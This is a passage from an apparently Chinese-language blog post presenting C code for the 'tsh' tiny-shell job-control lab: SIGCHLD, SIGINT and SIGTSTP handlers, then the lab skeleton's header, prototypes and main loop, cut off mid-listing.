WNOHANG | WUNTRACED)) &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (WIFEXITED(status))<br>        &#123; <span class="hljs-comment">/*process is exited in normal way*/</span><br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (WIFSIGNALED(status))<br>        &#123; <span class="hljs-comment">/*process is terminated by a signal*/</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));<br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (WIFSTOPPED(status))<br>        &#123; <span class="hljs-comment">/*process is stop because of a signal*/</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> getjobpid(jobs, pid);<br>            <span class="hljs-keyword">if</span> (job != <span class="hljs-literal">NULL</span>)<br>                job-&gt;state = ST;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = fgpid(jobs);<br><br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>)<br>    &#123;<br>        kill(-pid, SIGINT);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = fgpid(jobs);<br><br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> getjobpid(jobs, pid);<br>        <span class="hljs-keyword">if</span> (job-&gt;state == ST)<br>            <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            kill(-pid, SIGTSTP);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="å…¶ä½™ä»£ç "><a href="#å…¶ä½™ä»£ç " class="headerlink" title="å…¶ä½™ä»£ç "></a>å…¶ä½™ä»£ç </h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tsh - A tiny shell program with job control</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * &lt;Put your name and login ID here&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-comment">/* Misc manifest constants */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXLINE 1024   <span class="hljs-comment">/* max line size */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXARGS 128    <span class="hljs-comment">/* max args on a command line */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJOBS 16     <span class="hljs-comment">/* max jobs at any point in time */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJID 1 &lt;&lt; 16 <span class="hljs-comment">/* max job ID */</span></span><br><br><span class="hljs-comment">/* Job states */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNDEF 0 <span class="hljs-comment">/* undefined */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FG 1    <span class="hljs-comment">/* running in foreground */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BG 2    <span class="hljs-comment">/* running in background */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ST 3    <span class="hljs-comment">/* stopped */</span></span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span><br><span class="hljs-comment"> * Job state transitions and enabling actions:</span><br><span class="hljs-comment"> *     FG -&gt; ST  : ctrl-z</span><br><span class="hljs-comment"> *     ST -&gt; FG  : fg command</span><br><span class="hljs-comment"> *     ST -&gt; BG  : bg command</span><br><span class="hljs-comment"> *     BG -&gt; FG  : fg command</span><br><span class="hljs-comment"> * At most 1 job can be in the FG state.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* Global variables */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;   <span class="hljs-comment">/* defined in libc */</span><br><span class="hljs-keyword">char</span> prompt[] = <span class="hljs-string">&quot;tsh&gt; &quot;</span>; <span class="hljs-comment">/* command line prompt (DO NOT CHANGE) */</span><br><span class="hljs-keyword">int</span> verbose = <span class="hljs-number">0</span>;         <span class="hljs-comment">/* if true, print additional output */</span><br><span class="hljs-keyword">int</span> nextjid = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* next job ID to allocate */</span><br><span class="hljs-keyword">char</span> sbuf[MAXLINE];      <span class="hljs-comment">/* for composing sprintf messages */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span></span><br><span class="hljs-class">&#123;</span>                          <span class="hljs-comment">/* The job struct */</span><br>    <span class="hljs-keyword">pid_t</span> pid;             <span class="hljs-comment">/* job PID */</span><br>    <span class="hljs-keyword">int</span> jid;               <span class="hljs-comment">/* job ID [1, 2, ...] */</span><br>    <span class="hljs-keyword">int</span> state;             <span class="hljs-comment">/* UNDEF, BG, FG, or ST */</span><br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE]; <span class="hljs-comment">/* command line */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> <span class="hljs-title">jobs</span>[<span class="hljs-title">MAXJOBS</span>];</span> <span class="hljs-comment">/* The job list */</span><br><span class="hljs-comment">/* End global variables */</span><br><br><span class="hljs-comment">/* Function prototypes */</span><br><br><span class="hljs-comment">/* Here are the functions that you will implement */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-comment">/* Here are helper routines that we&#x27;ve provided for you */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handler_t</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span></span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * main - The shell&#x27;s main routine </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE];<br>    <span class="hljs-keyword">int</span> emit_prompt = <span class="hljs-number">1</span>; <span class="hljs-comment">/* emit prompt (default) */</span><br><br>    <span class="hljs-comment">/* Redirect stderr to stdout (so that driver will get all output</span><br><span class="hljs-comment">     * on the pipe connected to stdout) */</span><br>    dup2(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">/* Parse the command line */</span><br>    <span class="hljs-keyword">while</span> ((c = getopt(argc, argv, <span class="hljs-string">&quot;hvp&quot;</span>)) != EOF)<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (c)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-comment">/* print help message */</span><br>            usage();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-comment">/* emit additional diagnostic info */</span><br>            verbose = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:            <span class="hljs-comment">/* don&#x27;t print a prompt */</span><br>            emit_prompt = <span class="hljs-number">0</span>; <span class="hljs-comment">/* handy for automatic testing */</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            usage();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* Install the signal handlers */</span><br><br>    <span class="hljs-comment">/* These are the ones you will need to implement */</span><br>    Signal(SIGINT, sigint_handler);   <span class="hljs-comment">/* ctrl-c */</span><br>    Signal(SIGTSTP, sigtstp_handler); <span class="hljs-comment">/* ctrl-z */</span><br>    Signal(SIGCHLD, sigchld_handler); <span class="hljs-comment">/* Terminated or stopped child */</span><br><br>    <span class="hljs-comment">/* This one provides a clean way to kill the shell */</span><br>    Signal(SIGQUIT, sigquit_handler);<br><br>    <span class="hljs-comment">/* Initialize the job list */</span><br>    initjobs(jobs);<br><br>    <span class="hljs-comment">/* Execute the shell&#x27;s read/eval loop */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br><br>        <span class="hljs-comment">/* Read command line */</span><br>        <span class="hljs-keyword">if</span> (emit_prompt)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, prompt);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="hljs-built_in">stdin</span>) == <span class="hljs-literal">NULL</span>) &amp;&amp; ferror(<span class="hljs-built_in">stdin</span>))<br>            app_error(<span class="hljs-string">&quot;fgets error&quot;</span>);<br>        <span class="hljs-keyword">if</span> (feof(<span class="hljs-built_in">stdin</span>))<br>        &#123; <span class="hljs-comment">/* End of file (ctrl-d) */</span><br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* Evaluate the command line */</span><br>        eval(cmdline);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* control never reaches here */</span><br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="hljs-comment"><span class="hljs-function"> * </span></span><br><span class="hljs-comment"><span class="hljs-function"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="hljs-comment"><span class="hljs-function"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="hljs-comment"><span class="hljs-function"> * the user has requested a FG job.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    it immediately.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*****************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * Signal handlers</span></span><br><span class="hljs-comment"><span class="hljs-function"> *****************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigchld_handler - 